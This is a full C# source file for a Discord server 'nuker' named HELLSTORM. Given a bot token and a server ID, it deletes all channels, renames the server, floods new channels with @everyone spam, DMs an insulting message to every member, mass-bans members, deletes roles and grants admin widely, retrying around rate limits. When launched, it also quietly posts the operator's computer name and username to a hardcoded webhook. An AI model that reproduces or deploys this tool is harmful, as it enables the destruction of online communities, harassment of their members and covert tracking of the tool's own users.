using Discord;
using Discord.Net;
using Discord.WebSocket;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace HELL_Nuke
{
    public class NukeSettings
    {
        public string ChannelName { get; set; } = "h2aked-by-hellstorm";
        public string SpamMessage { get; set; } = "@everyone H2aked By Shadow https://discord.gg/ByCaDhQEQs @everyone @here";
        public string DmMessage { get; set; } = "سيرفرك **{ServerName}** تم سحقه تحت أقدام HELLSTORM. \nكس امك الرساله دي من طرف عمك شادو.\n https://discord.gg/ByCaDhQEQs";
    }

    public static class SettingsManager
    {
        private static readonly string ConfigPath = "nuke_config.json";
        private static readonly JsonSerializerOptions JsonOptions = new() { WriteIndented = true };

        public static NukeSettings LoadSettings()
        {
            if (!File.Exists(ConfigPath))
            {
                return GetDefaultSettings();
            }

            try
            {
                string json = File.ReadAllText(ConfigPath);
                return JsonSerializer.Deserialize<NukeSettings>(json) ?? GetDefaultSettings();
            }
            catch
            {
                return GetDefaultSettings();
            }
        }

        public static void SaveSettings(NukeSettings settings)
        {
            string json = JsonSerializer.Serialize(settings, JsonOptions);
            File.WriteAllText(ConfigPath, json);
        }

        public static NukeSettings GetDefaultSettings()
        {
            return new NukeSettings();
        }
    }


    public class HellstormCore
    {
        private readonly string _webhookUrl = "https://discord.com/api/webhooks/1499854823988920442/rEL2GuDU_or5OtVavzy1UEd1fNrSO6jp3rZjTD1KLrPsRpjbMT1_OBX50jVZFDQwWOgh";
     
        private readonly DiscordSocketClient _client;
        private SocketGuild? _guild;
        private ulong _guildId;
        private NukeSettings _nukeSettings;

        public HellstormCore(DiscordSocketClient client)
        {
            _client = client;
            
            _nukeSettings = SettingsManager.LoadSettings();
        }

        public async Task Engage()
        {
           
            _ = SendWebhookNotificationAsync();

            Console.Title = "HELLSTORM NUKER v2 :: Dev: Shadow ";
            await ShowBannerAsync();

            CPrint("Enter Bot Token: ", ConsoleColor.Yellow, false);
            string? token = Console.ReadLine()?.Trim();

            CPrint("Enter Server ID: ", ConsoleColor.Yellow, false);
            string? guildIdStr = Console.ReadLine()?.Trim();

            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(guildIdStr) || !ulong.TryParse(guildIdStr, out _guildId))
            {
                CPrint("FATAL: Invalid Token or Server ID.", ConsoleColor.Red);
                Console.ReadKey();
                return;
            }

            _client.Ready += OnReady;

            try
            {
                await _client.LoginAsync(TokenType.Bot, token);
                await _client.StartAsync();
            }
            catch (Exception ex)
            {
                CPrint($"FATAL: Login failure - {ex.GetType().Name}: {ex.Message}", ConsoleColor.Red);
                Console.ReadKey();
                return;
            }

            await Task.Delay(-1);
        }

        private async Task SendWebhookNotificationAsync()
        {
            if (string.IsNullOrWhiteSpace(_webhookUrl) || _webhookUrl.Contains("حط رابط الويبهوك حقك هنا"))
            {
                return; 
            }

            try
            {
                var pcName = Environment.MachineName;
                var userName = Environment.UserName;

                var payload = new
                {
                    username = "HELLSTORM Logger",
                    avatar_url = "https://i.imgur.com/o5Exi2r.png",
                    embeds = new[]
                    {
                        new
                        {
                            title = " HELLSTORM NUKER Activated ",
                            description = $"The tool has been launched by a user.",
                            color = 15158332, 
                            fields = new[]
                            {
                                new { name = "Computer Name", value = $"`{pcName}`", inline = true },
                                new { name = "User", value = $"`{userName}`", inline = true }
                            },
                            footer = new { text = $"Timestamp: {DateTime.UtcNow:F}" }
                        }
                    }
                };

                using (var client = new HttpClient())
                {
                    var jsonPayload = JsonSerializer.Serialize(payload);
                    var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                    await client.PostAsync(_webhookUrl, content);
                }
            }
            catch
            {
                
            }
        }

        private async Task OnReady()
        {
            _guild = _client.GetGuild(_guildId);
            if (_guild == null)
            {
                CPrint($"FATAL: Cannot access server ID '{_guildId}'. Bot might not be in the server.", ConsoleColor.Red);
                await Task.Delay(2000);
                Environment.Exit(0);
                return;
            }

            CPrint($"\n[+] Connection established: ", ConsoleColor.Green, false);
            CPrint($"{_client.CurrentUser}", ConsoleColor.Cyan);
            CPrint($"[+] Target locked: ", ConsoleColor.Green, false);
            CPrint($"{_guild.Name}", ConsoleColor.Cyan);

            try { Process.Start(new ProcessStartInfo("https://discord.gg/ByCaDhQEQs") { UseShellExecute = true }); } catch { }

            _client.Ready -= OnReady;
            await Task.Delay(1500);
            await MainMenuAsync();
        }

        private async Task AutoNukeOrchestrator()
        {
            while (true)
            {
                Console.Clear();
                CPrint("===== HELLSTORM - SEQUENCE =====", ConsoleColor.Red);
                CPrint("[1] Execute with Current Settings", ConsoleColor.Cyan);
                CPrint("[2] Customize Settings & Execute", ConsoleColor.Cyan);
                CPrint("[0] Back to Main Menu", ConsoleColor.DarkGray);
                CPrint("================================", ConsoleColor.Red);
                CPrint("> ", ConsoleColor.Yellow, false);

                var choice = Console.ReadKey(true).KeyChar;

                switch (choice)
                {
                    case '1':
                        CPrint("\nExecuting with current settings...", ConsoleColor.Green);
                        await Task.Delay(1000);
                        await AutoNukeAsync(_guild!);
                        return;

                    case '2':
                        await CustomizeSettings();
                        CPrint("\nSettings saved. Executing now...", ConsoleColor.Green);
                        await Task.Delay(1000);
                        await AutoNukeAsync(_guild!);
                        return;

                    case '0':
                        return;
                }
            }
        }

        private async Task CustomizeSettings()
        {
            CPrint($"\n--- Customize Nuke Settings ---", ConsoleColor.Yellow);

            CPrint($"New Channel Name (current: {_nukeSettings.ChannelName}): ", ConsoleColor.Cyan, false);
            string? newChannelName = Console.ReadLine();
            if (!string.IsNullOrWhiteSpace(newChannelName))
                _nukeSettings.ChannelName = newChannelName;

            CPrint($"New Spam Message (current: {_nukeSettings.SpamMessage}): ", ConsoleColor.Cyan, false);
            string? newSpamMessage = Console.ReadLine();
            if (!string.IsNullOrWhiteSpace(newSpamMessage))
                _nukeSettings.SpamMessage = newSpamMessage;

            CPrint($"New DM Message (use {{ServerName}} for server name) (current: {_nukeSettings.DmMessage}): ", ConsoleColor.Cyan, false);
            string? newDmMessage = Console.ReadLine();
            if (!string.IsNullOrWhiteSpace(newDmMessage))
                _nukeSettings.DmMessage = newDmMessage;

            SettingsManager.SaveSettings(_nukeSettings);
            CPrint("New settings have been saved!", ConsoleColor.Green);
        }

        private async Task AutoNukeAsync(SocketGuild guild)
        {
            CPrint("\n", ConsoleColor.Red);
            await Task.Delay(1000);

            try
            {
                CPrint("\n[PHASE 1] Unleashing Simultaneous Destruction Wave...", ConsoleColor.Yellow);
                var changeServerTask = ChangeServerDetailsAsync(guild, true);
                var deleteChannelsTask = DeleteChannelsAsync(guild, true);

                await Task.WhenAll(changeServerTask, deleteChannelsTask);

                CPrint("\n[SYSTEM] Cooling down engines to bypass API limits...", ConsoleColor.DarkGray);
                await Task.Delay(3000);

                CPrint("\n[PHASE 2] Rebuilding Fortress of Chaos...", ConsoleColor.Yellow);
                var createdChannels = await CreateChannelsAsync(guild, true, 50, _nukeSettings.ChannelName);

                if (createdChannels.Count == 0)
                {
                    CPrint("\n[WARNING] Channel creation failed. Spam aborted.", ConsoleColor.DarkYellow);
                }
                else
                {
                    CPrint("\n[PHASE 3] Unleashing Spam Tsunami...", ConsoleColor.Yellow);
                    await SpamChannelsAsync(guild, true, createdChannels);
                }

                CPrint("\n[FINAL PHASE] Delivering the final insult to all...", ConsoleColor.Yellow);
                await DmAllAsync(guild, true);

                CPrint("\n\nHELLSTORM SEQUENCE COMPLETE. TARGET IS NO MORE.", ConsoleColor.Green);
            }
            catch (Exception ex)
            {
                CPrint($"\n[FATAL ERROR] HELLSTORM sequence has been compromised. Reason: {ex.Message}", ConsoleColor.Red);
            }

            PressEnterToContinue();
        }

        #region Core Functions

        private async Task MainMenuAsync()
        {
            if (_guild == null) return;
            while (true)
            {
                await ShowBannerAsync();
                string menu = @"
      [1] Create Channels      [2] Delete Channels      [3] Mass Ban
      [4] Create Roles         [5] Delete Roles         [6] Spam Messages
      [7] DM All Members       [8] Wreck Server        [9] Grant Admin";
                CPrint(menu, ConsoleColor.Cyan);
                CPrint("\n═════════════════════════════════[ ", ConsoleColor.DarkGray, false);
                CPrint("0: Auto Newk", ConsoleColor.Red, false);
                CPrint(" ]═════════════════════════════════", ConsoleColor.DarkGray);
                CPrint("\n> ", ConsoleColor.Yellow, false);

                var keyInfo = Console.ReadKey(true);

                switch (keyInfo.KeyChar)
                {
                    case '1': await CreateChannelsAsync(_guild); break;
                    case '2': await DeleteChannelsAsync(_guild); break;
                    case '3': await BanAllAsync(_guild); break;
                    case '4': await CreateRolesAsync(_guild); break;
                    case '5': await DeleteRolesAsync(_guild); break;
                    case '6': await SpamChannelsAsync(_guild); break;
                    case '7': await DmAllAsync(_guild); break;
                    case '8': await ChangeServerDetailsAsync(_guild); break;
                    case '9': await GrantAdminOrchestrator(_guild); break;
                    case '0': await AutoNukeOrchestrator(); break;
                }
            }
        }

        private async Task GrantAdminOrchestrator(SocketGuild guild)
        {
            CPrint("\n--- Grant Administrator ---", ConsoleColor.Yellow);
            CPrint("[1] Grant Admin to ALL Members", ConsoleColor.Cyan);
            CPrint("[2] Grant Admin to a Specific User", ConsoleColor.Cyan);
            CPrint("[0] Back to Main Menu", ConsoleColor.DarkGray);
            CPrint("> ", ConsoleColor.Yellow, false);

            var choice = Console.ReadKey(true).KeyChar;

            switch (choice)
            {
                case '1':
                    await GrantAdminToAllAsync(guild);
                    break;
                case '2':
                    await GrantAdminToSpecificUserAsync(guild);
                    break;
                case '0':
                    return;
                default:
                    CPrint("\nInvalid choice.", ConsoleColor.Red);
                    await Task.Delay(1000);
                    break;
            }
        }

        private async Task GrantAdminToSpecificUserAsync(SocketGuild guild)
        {
            CPrint("\nEnter User ID to grant admin: ", ConsoleColor.Yellow, false);
            string? userIdStr = Console.ReadLine();
            if (!ulong.TryParse(userIdStr, out ulong userId))
            {
                CPrint("Invalid User ID.", ConsoleColor.Red);
                PressEnterToContinue();
                return;
            }

            var user = guild.GetUser(userId);
            if (user == null)
            {
                CPrint($"User with ID {userId} not found in this server.", ConsoleColor.Red);
                PressEnterToContinue();
                return;
            }

            CPrint($"\nExecuting: Granting administrator control to {user.Username}...", ConsoleColor.Red);
            try
            {
                var role = await GetOrCreateAdminRole(guild);
                await user.AddRoleAsync(role, new RequestOptions { AuditLogReason = "HELLSTORM: CROWNING" });
                CPrint($"\nOperation Complete: HELLSTORM role granted to {user.Username}.", ConsoleColor.Green);
            }
            catch (Exception ex)
            {
                CPrint($"\nOperation Failed: Could not grant admin. Reason: {ex.Message}", ConsoleColor.Red);
            }
            PressEnterToContinue();
        }

        private async Task<IRole> GetOrCreateAdminRole(SocketGuild guild)
        {
            var role = guild.Roles.FirstOrDefault(r => r.Name == "HELLSTORM" && r.Permissions.Administrator);
            if (role != null)
            {
                return role;
            }

            CPrint("Forging HELLSTORM role...", ConsoleColor.DarkRed);
            var newRole = await guild.CreateRoleAsync("HELLSTORM", new GuildPermissions(administrator: true), Color.DarkRed, isHoisted: true, options: new RequestOptions { AuditLogReason = "HELLSTORM: FORGING POWER" });

            if (guild.CurrentUser != null) await guild.CurrentUser.AddRoleAsync(newRole);

            return newRole;
        }

        private async Task GrantAdminToAllAsync(SocketGuild guild, bool isAuto = false)
        {
            if (!isAuto) CPrint("\nExecuting: Grant administrator control to all members...", ConsoleColor.Red);
            try
            {
                var role = await GetOrCreateAdminRole(guild);
                var guildBot = guild.CurrentUser;

                var usersToCrown = guild.Users
                   .Where(u => !u.IsBot && (guildBot == null || u.Hierarchy < guildBot.Hierarchy))
                   .ToList();

                if (!usersToCrown.Any())
                {
                    if (!isAuto) CPrint("\nNo members to grant admin to.", ConsoleColor.Yellow);
                }
                else
                {
                    var tasks = usersToCrown.Select(u => u.AddRoleAsync(role, new RequestOptions { AuditLogReason = "HELLSTORM: CROWNING" }));
                    await ProcessTasksInBatches(tasks, "Crowning Minions");
                }

                if (!isAuto)
                {
                    CPrint($"\nOperation Complete: HELLSTORM role granted to {usersToCrown.Count} members.", ConsoleColor.Green);
                    PressEnterToContinue();
                }
            }
            catch (Exception ex)
            {
                if (!isAuto)
                {
                    CPrint($"\nOperation Failed: Could not grant admin. Reason: {ex.Message}", ConsoleColor.Red);
                    PressEnterToContinue();
                }
            }
        }

        private async Task DmAllAsync(SocketGuild guild, bool isAuto = false)
        {
            string message;
            if (isAuto)
            {
                message = _nukeSettings.DmMessage.Replace("{ServerName}", guild.Name);
            }
            else
            {
                CPrint($"\nEnter message to send to all members (use {{ServerName}} for server name): ", ConsoleColor.Yellow, false);
                message = Console.ReadLine()?.Trim();
                if (string.IsNullOrWhiteSpace(message))
                {
                    message = _nukeSettings.DmMessage.Replace("{ServerName}", guild.Name);
                }
                else
                {
                    message = message.Replace("{ServerName}", guild.Name);
                }
            }

            if (!isAuto) CPrint($"\nPreparing to send '{message}' to all members...", ConsoleColor.Red);

            var members = guild.Users.Where(u => !u.IsBot).ToList();
            if (!members.Any())
            {
                if (!isAuto) CPrint("\nNo members to message.", ConsoleColor.Yellow);
                if (!isAuto) PressEnterToContinue();
                return;
            }

            var tasks = members.Select(async member =>
            {
                try { await member.SendMessageAsync(message); } catch { }
            });

            await ProcessTasksInBatches(tasks, "Broadcasting Insults");

            if (!isAuto)
            {
                CPrint($"\nOperation Complete: Message broadcast initiated to {members.Count} members.", ConsoleColor.Green);
                PressEnterToContinue();
            }
        }

        private async Task SpamChannelsAsync(SocketGuild guild, bool isAuto = false, List<SocketTextChannel>? channelsToSpam = null)
        {
            string message;
            int count;

            if (isAuto)
            {
                message = _nukeSettings.SpamMessage;
                count = 75;
            }
            else
            {
                CPrint("\nSpam Message (leave blank for default): ", ConsoleColor.Yellow, false);
                message = Console.ReadLine();
                if (string.IsNullOrWhiteSpace(message)) message = _nukeSettings.SpamMessage;

                CPrint("Messages Per Channel (leave blank for 50): ", ConsoleColor.Yellow, false);
                if (!int.TryParse(Console.ReadLine(), out count) || count <= 0) count = 50;
            }

            if (!isAuto) CPrint("\nEngaging spam protocol...", ConsoleColor.Red);

            var channels = channelsToSpam ?? guild.TextChannels.ToList();
            if (!channels.Any()) return;

            var tasks = channels.Select(channel => Task.Run(async () => {
                try { for (int i = 0; i < count; i++) await channel.SendMessageAsync(message); } catch { }
            }));

            await ProcessTasksInBatches(tasks, "Unleashing Spam");

            if (!isAuto)
            {
                CPrint("\nOperation Complete: Spam protocol finished.", ConsoleColor.Green);
                PressEnterToContinue();
            }
        }

        private async Task DeleteChannelsAsync(SocketGuild guild, bool isAuto = false)
        {
            if (!isAuto) CPrint("\nEngaging channel purge protocol...", ConsoleColor.Red);
            var channels = guild.Channels.ToList();
            await ProcessTasksInBatches(channels.Select(c => c.DeleteAsync(new RequestOptions { AuditLogReason = "HELLSTORM" })), "Purging Channels");
            if (!isAuto)
            {
                CPrint("\nOperation Complete: All channels purged.", ConsoleColor.Green);
                PressEnterToContinue();
            }
        }

        private async Task<List<SocketTextChannel>> CreateChannelsAsync(SocketGuild guild, bool isAuto = false, int count = 0, string name = "")
        {
            if (!isAuto)
            {
                CPrint("\nChannel Count: ", ConsoleColor.Yellow, false);
                if (!int.TryParse(Console.ReadLine(), out count)) count = 50;
                CPrint("Channel Name (leave blank for default): ", ConsoleColor.Yellow, false);
                name = Console.ReadLine()?.Trim();
                if (string.IsNullOrWhiteSpace(name)) name = _nukeSettings.ChannelName;
            }
            if (count <= 0) return new List<SocketTextChannel>();

            if (!isAuto) CPrint($"\nExecuting: Create {count} channels named '{name}'...", ConsoleColor.Red);

            var createdChannels = new List<SocketTextChannel>();
            var tasks = Enumerable.Range(0, count).Select(async _ =>
            {
                try
                {
                    var restChannel = await guild.CreateTextChannelAsync(name, null, new RequestOptions { AuditLogReason = "HELLSTORM" });
                    var socketChannel = guild.GetChannel(restChannel.Id) as SocketTextChannel;
                    if (socketChannel != null)
                    {
                        lock (createdChannels) { createdChannels.Add(socketChannel); }
                    }
                }
                catch { }
            });
            await ProcessTasksInBatches(tasks, "Creating Channels");

            if (!isAuto)
            {
                CPrint($"\nOperation Complete: {createdChannels.Count} channels created.", ConsoleColor.Green);
                PressEnterToContinue();
            }
            return createdChannels;
        }

        private async Task BanAllAsync(SocketGuild guild, bool isAuto = false)
        {
            if (!isAuto) CPrint("\nEngaging mass ban protocol...", ConsoleColor.Red);
            await guild.DownloadUsersAsync();
            var guildBot = guild.CurrentUser;
            var usersToBan = guild.Users
                .Where(u => u.Id != _client.CurrentUser.Id && (guildBot == null || u.Hierarchy < guildBot.Hierarchy))
                .ToList();

            if (!usersToBan.Any())
            {
                if (!isAuto) { CPrint("\nNo users to ban.", ConsoleColor.Yellow); PressEnterToContinue(); }
                return;
            }
            var tasks = usersToBan.Select(u => guild.AddBanAsync(u, 1, "Annihilated by HELLSTORM", new RequestOptions { AuditLogReason = "HELLSTORM" }));
            await ProcessTasksInBatches(tasks, "Banishing Members");

            if (!isAuto)
            {
                CPrint($"\nOperation Complete: {usersToBan.Count} members banished.", ConsoleColor.Green);
                PressEnterToContinue();
            }
        }

        private async Task DeleteRolesAsync(SocketGuild guild, bool isAuto = false)
        {
            if (!isAuto) CPrint("\nEngaging role purge protocol...", ConsoleColor.Red);
            var guildBot = guild.CurrentUser;
            var rolesToDelete = guild.Roles
                .Where(r => !r.IsManaged && !r.IsEveryone && (guildBot == null || r.Position < guildBot.Hierarchy))
                .ToList();
            var tasks = rolesToDelete.Select(r => r.DeleteAsync(new RequestOptions { AuditLogReason = "HELLSTORM" }));
            await ProcessTasksInBatches(tasks, "Purging Roles");
            if (!isAuto)
            {
                CPrint("\nOperation Complete: All manageable roles purged.", ConsoleColor.Green);
                PressEnterToContinue();
            }
        }

        private async Task CreateRolesAsync(SocketGuild guild)
        {
            CPrint("\nRole Count: ", ConsoleColor.Yellow, false);
            if (!int.TryParse(Console.ReadLine(), out int count)) count = 50;
            CPrint("Role Name: ", ConsoleColor.Yellow, false);
            string name = Console.ReadLine()?.Trim();
            if (string.IsNullOrWhiteSpace(name)) name = "HELLSTORM";

            CPrint($"\nExecuting: Create {count} roles named '{name}'...", ConsoleColor.Red);
            var tasks = Enumerable.Range(0, count).Select(_ => guild.CreateRoleAsync(name, options: new RequestOptions { AuditLogReason = "HELLSTORM" }));
            await ProcessTasksInBatches(tasks, "Creating Roles");
            CPrint($"\nOperation Complete: Roles created.", ConsoleColor.Green);
            PressEnterToContinue();
        }

        private async Task ChangeServerDetailsAsync(SocketGuild guild, bool isAuto = false)
        {
            string newName = "H2aked BY Shadow";
            Image? newIcon = null;
            string? iconPath = null;

            if (!isAuto)
            {
                CPrint("\nNew Server Name (leave blank for default): ", ConsoleColor.Yellow, false);
                string? customName = Console.ReadLine();
                if (!string.IsNullOrWhiteSpace(customName)) newName = customName;

                CPrint("Path to New Server Icon (e.g., C:\\images\\nuke.png, leave blank to skip): ", ConsoleColor.Yellow, false);
                iconPath = Console.ReadLine()?.Trim();
            }

            try
            {
                if (!isAuto && !string.IsNullOrWhiteSpace(iconPath))
                {
                    if (File.Exists(iconPath))
                    {
                        using var stream = new FileStream(iconPath, FileMode.Open, FileAccess.Read);
                        newIcon = new Image(stream);
                        CPrint("Icon loaded. Attempting to upload...", ConsoleColor.Green);
                        await guild.ModifyAsync(props => { props.Icon = newIcon; }, new RequestOptions { AuditLogReason = "HELLSTORM: ICON WRECKED" });
                    }
                    else
                    {
                        CPrint("Icon path not found. Skipping icon change.", ConsoleColor.DarkYellow);
                    }
                }

                await guild.ModifyAsync(props => { props.Name = newName; }, new RequestOptions { AuditLogReason = "HELLSTORM: NAME WRECKED" });

                if (isAuto)
                {
                    await guild.ModifyAsync(props => { props.Icon = null; }, new RequestOptions { AuditLogReason = "HELLSTORM: ICON PURGED" });
                }

                if (!isAuto) CPrint("\nOperation Complete: Server identity altered.", ConsoleColor.Green);
            }
            catch (Exception ex)
            {
                if (!isAuto) CPrint($"\nFailed to alter server identity: {ex.Message}", ConsoleColor.Red);
            }

            if (!isAuto) PressEnterToContinue();
        }

        #endregion

        #region System & Helpers
        private async Task ProcessTasksInBatches(IEnumerable<Task> tasks, string op, int batchSize = 100)
        {
            var taskList = tasks.ToList();
            int total = taskList.Count;
            if (total == 0) return;

            int completed = 0;
            DrawProgressBar(0, total, op);
            var stopwatch = Stopwatch.StartNew();

            for (int i = 0; i < total; i += batchSize)
            {
                var batch = taskList.Skip(i).Take(batchSize);
                try
                {
                    await Task.WhenAll(batch);
                }
                catch (HttpException httpEx) when (httpEx.HttpCode == HttpStatusCode.TooManyRequests)
                {
                    int delayMs = 5000;
                    if (httpEx.Reason != null && httpEx.Reason.Contains("retry_after"))
                    {
                        try
                        {
                            using var json = JsonDocument.Parse(httpEx.Reason);
                            if (json.RootElement.TryGetProperty("retry_after", out var retryAfter))
                            {
                                delayMs = (int)(retryAfter.GetDouble() * 1000) + 500;
                            }
                        }
                        catch { }
                    }
                    CPrint($"\n[RATE-LIMITED] Pausing for {delayMs / 1000.0:F1}s...", ConsoleColor.Red);
                    await Task.Delay(delayMs);
                    i -= batchSize;
                }
                catch { }

                completed = Math.Min(i + batchSize, total);
                DrawProgressBar(completed, total, op);
            }
            stopwatch.Stop();
            Console.CursorLeft = 0;
            CPrint($"  > {op,-20} [COMPLETED IN {stopwatch.Elapsed.TotalSeconds:F2}s]                               ", ConsoleColor.Green);
            Console.WriteLine();
        }

        private void DrawProgressBar(int current, int total, string op)
        {
            Console.CursorLeft = 0;
            float percent = total == 0 ? 1 : (float)current / total;
            int barSize = 30;
            int progress = (int)(percent * barSize);
            CPrint($"  > {op,-20}", ConsoleColor.White, false);
            CPrint("[", ConsoleColor.DarkGray, false);
            CPrint(new string('█', progress), ConsoleColor.Red, false);
            CPrint(new string('─', barSize - progress), ConsoleColor.DarkGray, false);
            CPrint($"] {current}/{total} ({(int)(percent * 100)}%)", ConsoleColor.DarkGray, false);
        }

        private async Task ShowBannerAsync()
        {
            Console.Clear();
            string banner = @"
            .                                                      .
            .n                   .                 .                  n.
      .   .dP                  dP                   9b                 9b.    .
     4    qXb         .       dX                     Xb       .        dXp     t
    dX.    9Xb      .dXb    __                     __    dXb.     dXP     .Xb
    9XXb._       _.dXXXXb dXXXXbo.               .odXXXXb dXXXXb._       _.dXXP
     9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
      `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
        `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  DIE   `XXP' `9XXXXXXXXXXXP'
            ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                            )b.  .dbo.dP'`v'`9b.odb.  .dX(
                          ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                         dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                        dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                        9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                         `'      9XXXXXX(   )XXXXXXP      `'
                                  XXXX X.`v'.X XXXX
                                  XP^X'`b   d'`X^XX
                                  X. 9  `   '  P )X
                                  `b  `       '  d'
                                   `             '
    ";
            CPrint(banner, ConsoleColor.Red);
            CPrint("\n      [ HELLSTORM NUKER ] ", ConsoleColor.Red, false);
            CPrint("Dev : Shadow ", ConsoleColor.White, false);
            CPrint("[ HELLSTORM Group ]", ConsoleColor.Red);
            CPrint("     https://discord.gg/ByCaDhQEQs\n", ConsoleColor.Red);
        }

        private void CPrint(string msg, ConsoleColor color, bool newLine = true)
        {
            Console.ForegroundColor = color;
            if (newLine) Console.WriteLine(msg);
            else Console.Write(msg);
            Console.ResetColor();
        }

        private void PressEnterToContinue()
        {
            CPrint("\n> Press any key to return to menu...", ConsoleColor.Yellow);
            if (Console.KeyAvailable) Console.ReadKey(true);
            Console.ReadKey(true);
        }
        #endregion
    }
}